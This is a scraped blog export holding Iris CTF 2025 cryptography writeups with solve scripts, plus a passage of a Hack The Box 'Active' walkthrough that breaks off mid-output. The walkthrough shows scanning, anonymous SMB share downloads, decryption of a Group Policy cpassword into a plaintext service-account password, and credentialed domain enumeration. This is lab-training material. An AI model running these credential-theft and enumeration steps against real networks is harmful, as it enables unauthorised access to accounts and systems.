
[{"content":"","date":"6 January 2025","externalUrl":null,"permalink":"/","section":"Chrono Nexus","summary":"","title":"Chrono Nexus","type":"page"},{"content":" Contains writeups for various CTF challenges with explanation and scripts. ","date":"6 January 2025","externalUrl":null,"permalink":"/ctf/","section":"CTF Writeups","summary":"Contains writeups for various CTF challenges with explanation and scripts.","title":"CTF Writeups","type":"ctf"},{"content":" Cryptography # kittycrypt # We are provided main.go and some example input output files.\n# main.go package main import ( \u0026#34;crypto/rand\u0026#34; \u0026#34;encoding/hex\u0026#34; \u0026#34;encoding/json\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;math/big\u0026#34; \u0026#34;os\u0026#34; \u0026#34;strings\u0026#34; ) var CharSet = map[rune]string{ \u0026#39;0\u0026#39;: \u0026#34;🐱\u0026#34;, \u0026#39;1\u0026#39;: \u0026#34;🐈\u0026#34;, \u0026#39;2\u0026#39;: \u0026#34;😸\u0026#34;, \u0026#39;3\u0026#39;: \u0026#34;😹\u0026#34;, \u0026#39;4\u0026#39;: \u0026#34;😺\u0026#34;, \u0026#39;5\u0026#39;: \u0026#34;😻\u0026#34;, \u0026#39;6\u0026#39;: \u0026#34;😼\u0026#34;, \u0026#39;7\u0026#39;: \u0026#34;😽\u0026#34;, \u0026#39;8\u0026#39;: \u0026#34;😾\u0026#34;, \u0026#39;9\u0026#39;: \u0026#34;😿\u0026#34;, \u0026#39;A\u0026#39;: \u0026#34;🙀\u0026#34;, \u0026#39;B\u0026#39;: \u0026#34;🐱‍👤\u0026#34;, \u0026#39;C\u0026#39;: \u0026#34;🐱‍🏍\u0026#34;, \u0026#39;D\u0026#39;: \u0026#34;🐱‍💻\u0026#34;, \u0026#39;E\u0026#39;: \u0026#34;🐱‍👓\u0026#34;, \u0026#39;F\u0026#39;: \u0026#34;🐱‍🚀\u0026#34;, } func catify(input string, keys []int) string { var keyedText string var result string for i, char := range input { keyedText += string(rune(int(char) + keys[i])) } fmt.Printf(\u0026#34;I2Keyed: %s\\n\u0026#34;, keyedText) hexEncoded := strings.ToUpper(hex.EncodeToString([]byte(keyedText))) fmt.Printf(\u0026#34;K2Hex: %s\\n\u0026#34;, hexEncoded) for _, rune := range hexEncoded { result += CharSet[rune] } return result } func savePair(name, input, output string) { inputFile, err := os.OpenFile(name+\u0026#34;_input.txt\u0026#34;, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0644) if err != nil { fmt.Println(err) return } defer inputFile.Close() outputFile, err := os.OpenFile(name+\u0026#34;_output.txt\u0026#34;, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0644) if err != nil { fmt.Println(err) return } defer outputFile.Close() if _, err := inputFile.Write([]byte(input)); err != nil { fmt.Println(err) return } if _, err := outputFile.Write([]byte(output)); err != nil { fmt.Println(err) return } } func getKeys(length int) []int { var keys = []int{} keyFileName := fmt.Sprintf(\u0026#34;keys_%d.json\u0026#34;, length) file, err := os.Open(keyFileName) if err != nil { for i := 0; i \u0026lt; length; i++ { num, _ := rand.Int(rand.Reader, big.NewInt(60000)) keys = append(keys, int(num.Int64())) } keyFile, err := os.OpenFile(keyFileName, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0644) if err != nil { fmt.Println(err) return []int{} } defer keyFile.Close() encoded, _ := json.Marshal(keys) keyFile.Write(encoded) return keys } json.NewDecoder(file).Decode(\u0026amp;keys) return keys } func main() { input := \u0026#34;You fools! You will never get my catnip!!!!!!!\u0026#34; keys := getKeys(len(input)) encoded := catify(input, keys) savePair(\u0026#34;example\u0026#34;, input, encoded) } The encryption starts by getting the encryption keys from the getKeys() function, which are stored in keys variable. The getKeys() function starts with generating length random numbers ranging from 0 - 59999, which are then stored in the key file. The encryption works by adding the ord() of the current character of the message with the current key, then convert them to hex. The hex representation is then converted to the cat emojis based on their value.\nSince we are given an example input and output, we can just get the encryption key value by subtracting the ASCII value of the output by the ASCII value of the input. We can then use the encryption key to decrypt the flag.\n# solve.py charset = { \u0026#39;0\u0026#39;: \u0026#34;🐱\u0026#34;, \u0026#39;1\u0026#39;: \u0026#34;🐈\u0026#34;, \u0026#39;2\u0026#39;: \u0026#34;😸\u0026#34;, \u0026#39;3\u0026#39;: \u0026#34;😹\u0026#34;, \u0026#39;4\u0026#39;: \u0026#34;😺\u0026#34;, \u0026#39;5\u0026#39;: \u0026#34;😻\u0026#34;, \u0026#39;6\u0026#39;: \u0026#34;😼\u0026#34;, \u0026#39;7\u0026#39;: \u0026#34;😽\u0026#34;, \u0026#39;8\u0026#39;: \u0026#34;😾\u0026#34;, \u0026#39;9\u0026#39;: \u0026#34;😿\u0026#34;, \u0026#39;A\u0026#39;: \u0026#34;🙀\u0026#34;, \u0026#39;B\u0026#39;: \u0026#34;🐱‍👤\u0026#34;, \u0026#39;C\u0026#39;: \u0026#34;🐱‍🏍\u0026#34;, \u0026#39;D\u0026#39;: \u0026#34;🐱‍💻\u0026#34;, \u0026#39;E\u0026#39;: \u0026#34;🐱‍👓\u0026#34;, \u0026#39;F\u0026#39;: \u0026#34;🐱‍🚀\u0026#34;, } ex_input = open(\u0026#34;example_input.txt\u0026#34;).read() ex_output = open(\u0026#34;example_output.txt\u0026#34;).read() enc_flag = open(\u0026#34;flag_output.txt\u0026#34;).read() for key, item in list(charset.items())[::-1]: ex_output = ex_output.replace(item, key) enc_flag = enc_flag.replace(item, key) ex_output = bytes.fromhex(ex_output).decode(\u0026#34;utf-8\u0026#34;) enc_flag = bytes.fromhex(enc_flag).decode(\u0026#34;utf-8\u0026#34;) key = [ord(ex_out) - ord(ex_in) for ex_in, ex_out in zip(ex_input, ex_output)] flag = [ord(flg_out) - keyb for keyb, flg_out in zip(key, enc_flag)] print(bytes(flag)) Flag: irisctf{s0m371m3s_bY735_4r3n7_wh47_y0u_3xp3c7}\nknutsacque # This challenge is upsolved from the author\u0026rsquo;s writeup. We are provided chal.sage and output.txt.\n# chal.sage import secrets F.\u0026lt;i,j,k\u0026gt; = QuaternionAlgebra(-1, -1) A = [] B = [1, i, j, k] msg_bin = b\u0026#34;irisctf{redacted_redacted_redacted_}\u0026#34; assert len(msg_bin) % 4 == 0 msg = [F(sum(Integer(msg_bin[idx+bi])*b for bi, b in enumerate(B))) for idx in range(0, len(msg_bin), len(B))] targ = 2^64 for _ in range(len(msg)): a = F(sum(secrets.randbelow(targ)*b for b in B)) A.append(a) sm = F(0) for idx in range(len(msg)): sm += msg[idx] * A[idx] print(\u0026#34;A =\u0026#34;, A) print(\u0026#34;s =\u0026#34;, sm) # output.txt A = [17182433425281628234 + 14279655808574179137*i + 8531159707880760053*j + 10324521189909330699*k, 10979190813462137563 + 11958433776450130274*i + 10360430094019091456*j + 11669398524919455091*k, 3230073756301653559 + 4778309388978960703*i + 7991444794442975980*j + 11596790291939515343*k, 11946083696500480600 + 18097491527846518653*i + 5640046632870036155*j + 2308502738741771335*k, 12639949829592355838 + 12578487825594881151*i + 5989294895593982847*j + 9055819202108394307*k, 15962426286361116943 + 6558955524158439283*i + 2284893063407554440*j + 14331331998172190719*k, 14588723113888416852 + 432503514368407804*i + 11024468666631962695*j + 10056344423714511721*k, 2058233428417594677 + 7708470259314925062*i + 7418836888786246673*j + 14461629396829662899*k, 4259431518253064343 + 9872607911298470259*i + 16758451559955816076*j + 16552476455431860146*k] s = -17021892191322790357078 + 19986226329660045481112*i + 15643261273292061217693*j + 21139791497063095405696*k The encryption starts by diving the message into blocks of four characters each, then use their ASCII values as coefficients to form a quaternion, which is a four dimensional vector.\nsage: msg = [F(sum(Integer(msg_bin[idx+bi])*b for bi, b in enumerate(B))) for idx in range(0, len(msg_bin), len(B))] sage: msg [105 + 114*i + 105*j + 115*k, 99 + 116*i + 102*j + 123*k, 114 + 101*i + 100*j + 97*k, 99 + 116*i + 101*j + 100*k, 95 + 114*i + 101*j + 100*k, 97 + 99*i + 116*j + 101*k, 100 + 95*i + 114*j + 101*k, 100 + 97*i + 99*j + 116*k, 101 + 100*i + 95*j + 125*k] It will then generate a list of quaternions with the same size as the msg quaternions above. The coefficients for the quaternions are randomly generated 64 bit integers.\nsage: for _ in range(len(msg)): ....: a = F(sum(secrets.randbelow(targ)*b for b in B)) ....: A.append(a) ....: sage: A [13837388767782043972 + 7809201807996912089*i + 12986947397704081026*j + 609619010023959748*k, 8771729123148867804 + 18103239779347531290*i + 6575900090027619404*j + 18328038587554093584*k, 977244651506020571 + 12569942643005573095*i + 6978627459516744464*j + 6479286072282315114*k, 12411012500437879663 + 2135025104182005264*i + 5425268026679454877*j + 702427975534281031*k, 17100667416476938058 + 1808064680619569426*i + 7772845331222421881*j + 4476043718848060056*k, 3814478570682782772 + 14090353431496533110*i + 2084415528130555435*j + 6783308246110605206*k, 3715153897463101027 + 6448272151618476822*i + 15602473372192830651*j + 12939978103417235880*k, 14634677867118958438 + 13682483499628209437*i + 2144135849019529928*j + 12058704514056147705*k, 14930035260794662679 + 6646560134513752972*i + 6487028501149968035*j + 10209325974838223425*k] It will then combine A and msg by multiplying the elements together. Each element of A and msg are quaternions, so the quaternion multiplication rule applies as shown below.\nq1 = a1 + b1*i + c1*j + d1*k q2 = a2 + b2*i + c2*j + d2*k x = a1*​a2​ − b1*​b2 ​− c1*​c2​ − d1*​d2 y = a1*​b2 ​+ b1*​a2 ​+ c1*​d2 ​− d1*​c2 z = a1*​c2 ​− b1*​d2 ​+ c1*​a2 ​+ d1*​b2 w = a1*​d2 ​+ b1*​c2 ​− c1*​b2 ​+ d1*​a2 q1*q2 = x + y*i + z*j + w*k​​​ After all of the quaternions of A and msg are multiplied together, they are all summed into a single quaternion sm which is the result. Now we have to recover the value of msg given A and sm. If we pay a close attention, then we will notice that this is a Knapsack problem, as we are given a list of quaternions (general knapsack) A and the sum sm. The Knapsack problem can be solved using LLL, so let\u0026rsquo;s construct the matrix first. Here\u0026rsquo;s how we can build the matrix M to use for the LLL based on this paper.\n! Some elements in matrix M here is still in form of quaternions, so we will have to convert them to into another matrix with elements in the complex field, followed by another conversion to another matrix with elements over the integers. Only then we can use LLL to the resulting matrix.\n! ! # Representation of a quaternion a + bi + cj + dk as matrix over Z [ a -b c -d] [ b a d c] [-c -d a b] [ d -c -b a] The output matrix of the LLL algorithm has to be sliced per blocks (per 4 elements) because it is formed from the quaternion 1, i, j, k. We will then filter for valid results where the coefficients are valid ASCII values between 0 and 128, then check each valid results if they are the flag. Here\u0026rsquo;s the full solve script.\nF.\u0026lt;i,j,k\u0026gt; = QuaternionAlgebra(-1, -1) load(\u0026#34;output.sage\u0026#34;) # output.txt A = [F(a) for a in A] sm = F(s) n = len(A) N = F(1024) # scaling # Create matrix M M = Matrix(F, n+1, n+1) for i in range(n): M[i, i] = 1 M[i, n] = N * A[i] M[n, n] = N * sm # Convert quaternion matrix to complex numbers (Z[i]) matrix def quaterToComplexMatrix(M): rows = [] for row in M: nr = [e[0]+e[1]*I for e in row] + [e[2]+e[3]*I for e in row] rows.append(nr) for row in M: nr = [-e[2]+e[3]*I for e in row] + [e[0]-e[1]*I for e in row] rows.append(nr) return matrix(ZZ[I], rows) # Convert complex numbers matrix to matrix over the integers def complexToRealMatrix(M): rows = [] for row in M: nr = [e.real() for e in row] + [-e.imag() for e in row] rows.append(nr) for row in M: nr = [e.imag() for e in row] + [e.real() for e in row] rows.append(nr) return matrix(ZZ, rows) Mc = quaterToComplexMatrix(M) Mr = complexToRealMatrix(Mc) M_reduced = Mr.LLL() # Extract possible results (blocks) for the resulting matrix possible_res = set() for row in M_reduced: nl = len(row) // 4 for ni in range(4): if all(int(x) \u0026gt; 0 and int(x) \u0026lt; 128 for x in row[ni*nl:ni*nl+nl-1]): possible_res.add(bytes([int(x) for x in row[ni*nl:ni*nl+nl-1]])) if all(int(-x) \u0026gt; 0 and int(-x) \u0026lt; 128 for x in row[ni*nl:ni*nl+nl-1]): possible_res.add(bytes([int(-x) for x in row[ni*nl:ni*nl+nl-1]])) print(possible_res) import itertools # Test result for all ordering of the possible_res blocks for per in itertools.permutations(possible_res, int(4)): curr = b\u0026#34;\u0026#34;.join(bytes([per[nj][ni] for nj in range(4)]) for ni in range(len(per[0]))) if b\u0026#34;irisctf{\u0026#34; in curr: print(curr) break Flag: irisctf{wow_i_cant_believe_its_lll!}\nLink, resources:\nhttps://en.wikipedia.org/wiki/Quaternion https://en.wikipedia.org/wiki/Complex_number https://github.com/Seraphin-/ctf/blob/master/2025/irisctf/knutsacque.md https://www.cs.sjsu.edu/faculty/stamp/papers/topics/topic16/Knapsack.pdf ","date":"6 January 2025","externalUrl":null,"permalink":"/ctf/irisctf2025/","section":"CTF Writeups","summary":"Iris CTF 2025 challenge writeups.","title":"Iris CTF 2025","type":"ctf"},{"content":"","date":"17 November 2024","externalUrl":null,"permalink":"/tags/easy/","section":"Tags","summary":"","title":"Easy","type":"tags"},{"content":" Recon # Nmap # ┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/active-windows] └─$ sudo nmap -p- --min-rate 10000 10.10.10.100 [sudo] password for chronopad: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-17 16:38 WIB Warning: 10.10.10.100 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.100 Host is up (0.18s latency). Not shown: 60303 closed tcp ports (reset), 5210 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5722/tcp open msdfsr 9389/tcp open adws 49152/tcp open unknown 49153/tcp open unknown 49154/tcp open unknown 49155/tcp open unknown 49157/tcp open unknown 49158/tcp open unknown 49165/tcp open unknown 49171/tcp open unknown 49173/tcp open unknown ┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/active-windows] └─$ sudo nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,49152,49153,49154,49155,49157,49158,49165,49171,49173 -sCV 10.10.10.100 --stats-every=10s PORT STATE SERVICE VERSION 53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) | dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39) 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-17 09:41:04Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5722/tcp open msrpc Microsoft Windows RPC 9389/tcp open mc-nmf .NET Message Framing 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49158/tcp open msrpc Microsoft Windows RPC 49165/tcp open msrpc Microsoft Windows RPC 49171/tcp open msrpc Microsoft Windows RPC 49173/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 2:1:0: |_ Message signing enabled and required | smb2-time: | date: 2024-11-17T09:42:07 |_ start_date: 2024-11-17T09:37:12 TCP port 139,445 - SMB # Enumerate SMB with netexec, successor to crackmapexec. Start with SMB NULL session.\n┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/active-windows] └─$ netexec smb 10.10.10.100 -u \u0026#34;\u0026#34; -p \u0026#34;\u0026#34; SMB 10.10.10.100 445 DC [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False) SMB 10.10.10.100 445 DC [+] active.htb\\: Found domain name active.htb. List all of the shares by adding --shares, or just use smbmap to list available shares recursively.\n┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/active-windows] └─$ smbmap -H 10.10.10.100 -r --depth 10 ________ ___ ___ _______ ___ ___ __ _______ /\u0026#34; )|\u0026#34; \\ /\u0026#34; || _ \u0026#34;\\ |\u0026#34; \\ /\u0026#34; | /\u0026#34;\u0026#34;\\ | __ \u0026#34;\\ (: \\___/ \\ \\ // |(. |_) :) \\ \\ // | / \\ (. |__) :) \\___ \\ /\\ \\/. ||: \\/ /\\ \\/. | /\u0026#39; /\\ \\ |: ____/ __/ \\ |: \\. |(| _ \\ |: \\. | // __\u0026#39; \\ (| / /\u0026#34; \\ :) |. \\ /: ||: |_) :)|. \\ /: | / / \\ \\ /|__/ \\ (_______/ |___|\\__/|___|(_______/ |___|\\__/|___|(___/ \\___)(_______) ----------------------------------------------------------------------------- SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com https://github.com/ShawnDEvans/smbmap [*] Detected 1 hosts serving SMB [*] Established 1 SMB connections(s) and 1 authenticated session(s) [+] IP: 10.10.10.100:445 Name: active.htb Status: Authenticated Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share IPC$ NO ACCESS Remote IPC NETLOGON NO ACCESS Logon server share Replication READ ONLY ./Replication dr--r--r-- 0 Sat Jul 21 17:37:44 2018 . dr--r--r-- 0 Sat Jul 21 17:37:44 2018 .. dr--r--r-- 0 Sat Jul 21 17:37:44 2018 active.htb ./Replication//active.htb dr--r--r-- 0 Sat Jul 21 17:37:44 2018 . dr--r--r-- 0 Sat Jul 21 17:37:44 2018 .. dr--r--r-- 0 Sat Jul 21 17:37:44 2018 DfsrPrivate dr--r--r-- 0 Sat Jul 21 17:37:44 2018 Policies dr--r--r-- 0 Sat Jul 21 17:37:44 2018 scripts ./Replication//active.htb/DfsrPrivate dr--r--r-- 0 Sat Jul 21 17:37:44 2018 . dr--r--r-- 0 Sat Jul 21 17:37:44 2018 .. dr--r--r-- 0 Sat Jul 21 17:37:44 2018 ConflictAndDeleted dr--r--r-- 0 Sat Jul 21 17:37:44 2018 Deleted dr--r--r-- 0 Sat Jul 21 17:37:44 2018 Installing ./Replication//active.htb/Policies dr--r--r-- 0 Sat Jul 21 17:37:44 2018 . dr--r--r-- 0 Sat Jul 21 17:37:44 2018 .. dr--r--r-- 0 Sat Jul 21 17:37:44 2018 {31B2F340-016D-11D2-945F-00C04FB984F9} dr--r--r-- 0 Sat Jul 21 17:37:44 2018 {6AC1786C-016F-11D2-945F-00C04fB984F9} ./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9} dr--r--r-- 0 Sat Jul 21 17:37:44 2018 . dr--r--r-- 0 Sat Jul 21 17:37:44 2018 .. fr--r--r-- 23 Sat Jul 21 17:38:11 2018 GPT.INI dr--r--r-- 0 Sat Jul 21 17:37:44 2018 Group Policy dr--r--r-- 0 Sat Jul 21 17:37:44 2018 MACHINE dr--r--r-- 0 Sat Jul 21 17:37:44 2018 USER ./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy dr--r--r-- 0 Sat Jul 21 17:37:44 2018 . dr--r--r-- 0 Sat Jul 21 17:37:44 2018 .. fr--r--r-- 119 Sat Jul 21 17:38:11 2018 GPE.INI ./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE dr--r--r-- 0 Sat Jul 21 17:37:44 2018 . dr--r--r-- 0 Sat Jul 21 17:37:44 2018 .. dr--r--r-- 0 Sat Jul 21 17:37:44 2018 Microsoft dr--r--r-- 0 Sat Jul 21 17:37:44 2018 Preferences fr--r--r-- 2788 Sat Jul 21 17:38:11 2018 Registry.pol ./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft dr--r--r-- 0 Sat Jul 21 17:37:44 2018 . dr--r--r-- 0 Sat Jul 21 17:37:44 2018 .. dr--r--r-- 0 Sat Jul 21 17:37:44 2018 Windows NT ./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT dr--r--r-- 0 Sat Jul 21 17:37:44 2018 . dr--r--r-- 0 Sat Jul 21 17:37:44 2018 .. dr--r--r-- 0 Sat Jul 21 17:37:44 2018 SecEdit ./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit dr--r--r-- 0 Sat Jul 21 17:37:44 2018 . dr--r--r-- 0 Sat Jul 21 17:37:44 2018 .. fr--r--r-- 1098 Sat Jul 21 17:38:11 2018 GptTmpl.inf ./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences dr--r--r-- 0 Sat Jul 21 17:37:44 2018 . dr--r--r-- 0 Sat Jul 21 17:37:44 2018 .. dr--r--r-- 0 Sat Jul 21 17:37:44 2018 Groups ./Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups dr--r--r-- 0 Sat Jul 21 17:37:44 2018 . dr--r--r-- 0 Sat Jul 21 17:37:44 2018 .. fr--r--r-- 533 Sat Jul 21 17:38:11 2018 Groups.xml ./Replication//active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9} dr--r--r-- 0 Sat Jul 21 17:37:44 2018 . dr--r--r-- 0 Sat Jul 21 17:37:44 2018 .. fr--r--r-- 22 Sat Jul 21 17:38:11 2018 GPT.INI dr--r--r-- 0 Sat Jul 21 17:37:44 2018 MACHINE dr--r--r-- 0 Sat Jul 21 17:37:44 2018 USER ./Replication//active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE dr--r--r-- 0 Sat Jul 21 17:37:44 2018 . dr--r--r-- 0 Sat Jul 21 17:37:44 2018 .. dr--r--r-- 0 Sat Jul 21 17:37:44 2018 Microsoft ./Replication//active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft dr--r--r-- 0 Sat Jul 21 17:37:44 2018 . dr--r--r-- 0 Sat Jul 21 17:37:44 2018 .. dr--r--r-- 0 Sat Jul 21 17:37:44 2018 Windows NT ./Replication//active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT dr--r--r-- 0 Sat Jul 21 17:37:44 2018 . dr--r--r-- 0 Sat Jul 21 17:37:44 2018 .. dr--r--r-- 0 Sat Jul 21 17:37:44 2018 SecEdit ./Replication//active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit dr--r--r-- 0 Sat Jul 21 17:37:44 2018 . dr--r--r-- 0 Sat Jul 21 17:37:44 2018 .. fr--r--r-- 3722 Sat Jul 21 17:38:11 2018 GptTmpl.inf SYSVOL NO ACCESS Logon server share Users NO ACCESS [*] Closed 1 connections Found interesting file Groups.xml. You can also download all of the files inside of the share.\n┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/active-windows] └─$ smbclient \\\\\\\\10.10.10.100\\\\Replication Password for [WORKGROUP\\chronopad]: Anonymous login successful Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; RECURSE ON smb: \\\u0026gt; PROMPT OFF smb: \\\u0026gt; mget * getting file \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\GPT.INI of size 23 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec) getting file \\active.htb\\Policies\\{6AC1786C-016F-11D2-945F-00C04fB984F9}\\GPT.INI of size 22 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec) getting file \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\Group Policy\\GPE.INI of size 119 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec) getting file \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Registry.pol of size 2788 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (1.8 KiloBytes/sec) (average 0.7 KiloBytes/sec) getting file \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups\\Groups.xml of size 533 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (0.5 KiloBytes/sec) (average 0.6 KiloBytes/sec) getting file \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf of size 1098 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (1.4 KiloBytes/sec) (average 0.7 KiloBytes/sec) getting file \\active.htb\\Policies\\{6AC1786C-016F-11D2-945F-00C04fB984F9}\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf of size 3722 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (3.0 KiloBytes/sec) (average 1.1 KiloBytes/sec) smb: \\\u0026gt; User Flag # Decrypting password # Groups.xml\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;Groups clsid=\u0026#34;{3125E937-EB16-4b4c-9934-544FC6D24D26}\u0026#34;\u0026gt;\u0026lt;User clsid=\u0026#34;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}\u0026#34; name=\u0026#34;active.htb\\SVC_TGS\u0026#34; image=\u0026#34;2\u0026#34; changed=\u0026#34;2018-07-18 20:46:06\u0026#34; uid=\u0026#34;{EF57DA28-5F69-4530-A59E-AAB58578219D}\u0026#34;\u0026gt;\u0026lt;Properties action=\u0026#34;U\u0026#34; newName=\u0026#34;\u0026#34; fullName=\u0026#34;\u0026#34; description=\u0026#34;\u0026#34; cpassword=\u0026#34;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\u0026#34; changeLogon=\u0026#34;0\u0026#34; noChange=\u0026#34;1\u0026#34; neverExpires=\u0026#34;1\u0026#34; acctDisabled=\u0026#34;0\u0026#34; userName=\u0026#34;active.htb\\SVC_TGS\u0026#34;/\u0026gt;\u0026lt;/User\u0026gt; \u0026lt;/Groups\u0026gt; This file is apparently a Group Policy Preferences (GPP) XML file, containing a configuration data for the active.htb\\SVC_TGS user. The password is decrypted, but can be easily reversible using gpp-decrypt tool.\n┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/active-windows] └─$ echo \u0026#39;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\u0026#39; \u0026gt; svc_tgs.pass ┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/active-windows] └─$ gpp-decrypt $(cat svc_tgs.pass ) GPPstillStandingStrong2k18 Obtained credentials: SVC_TGS:GPPstillStandingStrong2k18. Verify credentials with netexec.\n┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/active-windows] └─$ netexec smb 10.10.10.100 -u \u0026#34;SVC_TGS\u0026#34; -p \u0026#34;GPPstillStandingStrong2k18\u0026#34; SMB 10.10.10.100 445 DC [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False) SMB 10.10.10.100 445 DC [+] active.htb\\SVC_TGS:GPPstillStandingStrong2k18 AD credentialed enumeration # List all user accounts and available shares with netexec.\n┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/active-windows] └─$ netexec smb 10.10.10.100 -u \u0026#34;SVC_TGS\u0026#34; -p \u0026#34;GPPstillStandingStrong2k18\u0026#34; --users SMB 10.10.10.100 445 DC [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False) SMB 10.10.10.100 445 DC [+] active.htb\\SVC_TGS:GPPstillStandingStrong2k18 SMB 10.10.10.100 445 DC -Username- -Last PW Set- -BadPW- -Description- SMB 10.10.10.100 445 DC Administrator 2018-07-18 19:06:40 0 Built-in account for administering the computer/domain SMB 10.10.10.100 445 DC Guest \u0026lt;never\u0026gt; 0 Built-in account for guest access to the computer/domain SMB 10.10.10.100 445 DC krbtgt 2018-07-18 18:50:36 0 Key Distribution Center Service Account SMB 10.10.10.100 445 DC SVC_TGS 2018-07-18 20:14:38 0 SMB 10.10.10.100 445 DC [*] Enumerated 4 local users: ACTIVE ┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/active-windows] └─$ netexec smb 10.10.10.100 -u \u0026#34;SVC_TGS\u0026#34; -p \u0026#34;GPPstillStandingStrong2k18\u0026#34; --shares SMB 10.10.10.100 445 DC [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False) SMB 10.10.10.100 445 DC [+] active.htb\\SVC_TGS:GPPstillStandingStrong2k18 SMB 